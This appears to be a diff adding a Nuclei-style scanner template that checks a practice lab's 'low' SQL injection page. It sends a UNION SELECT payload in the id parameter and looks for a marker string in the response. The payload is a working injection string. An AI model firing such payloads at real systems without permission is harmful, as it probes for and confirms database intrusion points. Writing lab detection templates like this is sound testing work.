@@ -1,0 +1,28 @@
+id: vulnlab-sqli-low
+
+info:
+  name: VulnLab SQL 注入 low 档
+  author: hediwen
+  severity: high
+  tags: vulnlab,sqli
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/sqli/low.php?id=-1%20UNION%20SELECT%201,'VULNLAB_POC_MARKER',3,4"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "VULNLAB_POC_MARKER</td>"
+      - type: word
+        part: body
+        words:
+          - "SQLSTATE"
+          - "syntax error"
+        condition: or
+        negative: true
+
